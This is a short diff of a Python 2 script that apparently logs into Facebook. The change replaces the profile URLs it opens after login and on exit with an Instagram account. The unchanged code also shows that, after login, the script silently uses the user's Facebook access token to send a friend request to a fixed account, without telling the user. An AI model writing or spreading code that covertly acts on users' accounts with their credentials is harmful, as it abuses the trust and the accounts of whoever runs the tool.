@@ -180,7 +180,7 @@ def login():
 				zedd.close()
 				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://www.facebook.com/yoga.wira.188')
+				os.system('xdg-open https://www.instagram.com/wa.stry23')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;91m[!] No connection"
@@ -288,7 +288,7 @@ def pilih():
 		os.remove('out')
 	elif zedd =="8":
 		os.system('rm -rf login.txt')
-		os.system('xdg-open https://www.facebook.com/rendi.andika.3133')
+		os.system('xdg-open https://www.instagram.com/wa.stry23')
 		keluar()
 	elif zedd =="0":
 		keluar()
